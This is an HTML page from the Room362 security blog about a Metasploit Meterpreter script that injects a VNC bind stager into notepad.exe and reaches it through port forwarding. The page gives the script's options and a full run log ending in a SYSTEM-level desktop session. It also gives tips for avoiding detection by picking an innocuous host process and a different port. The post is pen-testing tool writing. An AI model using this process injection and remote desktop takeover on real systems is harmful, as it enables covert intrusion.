@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.15" />
+
+  <title>Meterpreter tunneling and VNC revamped &middot; Room362</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Room362" href="http://room362.com/index.xml" />
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/androidstudio.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+  <link rel="shortcut icon" href="http://room362.com/img/favicon.ico" type="image/x-icon" />
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/brandon/"><i class='fa fa-users fa-fw'></i>Brandon</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://room362.com/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://twitter.com/mubix" target="_blank"><i class="fa fa-twitter fa-fw"></i>Twitter</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://facebook.com/mubix" target="_blank"><i class="fa fa-facebook fa-fw"></i>Facebook</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://plus.google.com/+mubix" target="_blank"><i class="fa fa-google-plus-square fa-fw"></i>Google+</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://instagram.com/mubix" target="_blank"><i class="fa fa-instagram fa-fw"></i>Instagram</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://flickr.com/photos/mubix" target="_blank"><i class="fa fa-flickr fa-fw"></i>Flickr</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://youtube.com/user/hak5" target="_blank"><i class="fa fa-youtube fa-fw"></i>YouTube</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://vimeo.com/mubix" target="_blank"><i class="fa fa-vimeo fa-fw"></i>Vimeo</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://slideshare.net/mubix" target="_blank"><i class="fa fa-slideshare fa-fw"></i>SlideShare</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://linkedin.com/in/mubix" target="_blank"><i class="fa fa-linkedin fa-fw"></i>LinkedIn</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://reddit.com/user/mubix" target="_blank"><i class="fa fa-reddit fa-fw"></i>Reddit</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/mubix" target="_blank"><i class="fa fa-github-alt fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https:////bitbucket.org/mubix" target="_blank"><i class="fa fa-bitbucket fa-fw"></i>Bitbucket</a>
+    </li>
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Meterpreter tunneling and VNC revamped</h1>
+  <h2></h2>
+</div>
+<div class="content">
+  
+
+<p>So yesterday (December 14th, 2009) <a href="http://twitter.com/hdmoore">HD Moore</a> posted <a href="http://twitter.com/hdmoore/status/6663737357">a tweet</a> with a pic of the new VNC meterpreter script that he wrote:</p>
+
+<p><img src="/images/postimages/200912_vnc_1.png" alt="" /></p>
+
+<p>Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.</p>
+
+<p><a href="https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb">https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb</a></p>
+
+<p>Or you can get it via the SVN at <a href="https://metasploit.com/redmine/projects/framework/repository/revisions/7872">Revision 7872</a></p>
+
+<p>By creating a bind payload instead of a reverse connect we can have the payload listen locally. Then with portfwd command (just like on your home router) we forward a local port to the local host on the remote side, to the binded port. Connecting to the freshly bound port as if we were actually doing everything on the box itself. Creating a new session and a nice beautiful VNC window.</p>
+
+<h2 id="options:219f4d40dc81e5a362b4bd4c55416513">Options:</h2>
+
+<pre><code>meterpreter &gt; run vnc_oneport -h
+
+OPTIONS:  
+-e &lt;opt&gt; The process to run and inject into (default: notepad.exe)  
+-h  This help menu  
+-l &lt;opt&gt; The local port to listen on via port forwarding (default: 5901)  
+-p &lt;opt&gt; The port on the remote host to bind VNC to (default: randomized)
+
+meterpreter &gt;
+</code></pre>
+
+<h2 id="example-run:219f4d40dc81e5a362b4bd4c55416513">Example Run:</h2>
+
+<pre><code>[*] Meterpreter session 1 opened (192.168.92.103:4444 -&gt; 192.168.92.113:1038)
+
+meterpreter &gt; **_run vnc_oneport_**
+[*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207
+[*] Host process notepad.exe has PID 532
+[*] Allocated memory at address 0x00640000
+[*] Writing the VNC stager into memory...
+[*] Running Payload
+[*] Creating a new thread within notepad.exe to run the VNC stager...
+[*] Starting the port forwarding from 5901 =&gt; TARGET:1207
+[*] Local TCP relay created: 0.0.0.0:5901 &lt;-&gt; 127.0.0.1:1207
+
+meterpreter &gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&gt; 127.0.0.1:5901)
+Connected to RFB server, using protocol version 3.3
+No authentication needed
+Desktop name &quot;VNCShell [SYSTEM@WORKSTATION1] - Full Access&quot;
+VNC server default format:
+32 bits per pixel.
+Least significant byte first in each pixel.
+	True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+	Using default colormap which is TrueColor.  Pixel format:
+	32 bits per pixel.
+Least significant byte first in each pixel.
+	True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+	Using shared memory PutImage
+Same machine: preferring raw encoding
+ShmCleanup called
+[*] VNC Server session 2 closed.
+meterpreter &gt;
+[*] Meterpreter session 1 opened (192.168.92.103:4444 -&gt; 192.168.92.113:1038)  
+meterpreter &gt; run vnc_oneport  
+[*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207  
+[*] Host process notepad.exe has PID 532  
+[*] Allocated memory at address 0x00640000  
+[*] Writing the VNC stager into memory...  
+[*] Running Payload  
+[*] Creating a new thread within notepad.exe to run the VNC stager...  
+[*] Starting the port forwarding from 5901 =&gt; TARGET:1207  
+[*] Local TCP relay created: 0.0.0.0:5901 &lt;-&gt; 127.0.0.1:1207  
+meterpreter &gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&gt; 127.0.0.1:5901)  
+Connected to RFB server, using protocol version 3.3  
+No authentication needed  
+Desktop name &quot;VNCShell [SYSTEM@WORKSTATION1] - Full Access&quot;VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
+Using default colormap which is TrueColor.  Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
+Using shared memory PutImageSame machine: preferring raw encodingShmCleanup called  
+[*] VNC Server session 2 closed.
+
+meterpreter &gt;
+</code></pre>
+
+<h2 id="note:219f4d40dc81e5a362b4bd4c55416513">Note:</h2>
+
+<p>The forwarded port does not close even if the meterpreter session is ended, so use the following command to close the forward:</p>
+
+<p>```
+meterpreter &gt; portfwd delete -l 5901<br />
+[*] Successfully stopped TCP relay on 0.0.0.0:5901
+meterpreter &gt;</p>
+
+<p>(Note to BT4 users: do a <code>apt-get install vncviewer</code> before using any of the vnc payloads in Metasploit)</p>
+
+<p>The script utilizes just one of the millions of way you can leverage &lsquo;portfwd&rsquo; in your endeavors. But where it gets interesting is the fact that the delivery method for the payload never touches disk. That magic is all credited to HD though. What happens is a new process is created (notepad by default) and the newly created VNC bind payload is injected into it. But, the beauty is that it&rsquo;s doing local connections via the port forwarding so all you see in TCPView is:</p>
+
+<p><img src="/images/postimages/200912_vnc_2.png" alt="" /></p>
+
+<p>Now it&rsquo;s definitely suspicious that Notepad has any connections at all, but you can use the option <code>-e</code> to provide any executable you wish, as long as it&rsquo;s in the path for the system. For examples, look at what&rsquo;s running naturally already.</p>
+
+<p>Plus, you would probably not be using port 4444 for a meterpreter session. But what I wanted to demonstrate with this script is the power of both meterpreter, and port forwarding.</p>
+
+<p>Now it&rsquo;s your turn to make it better. Take a look at the guts, see if anything will help you in your scripting.</p>
+
+</div>
+
+</div>
+</div>
+<script src="http://room362.com/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
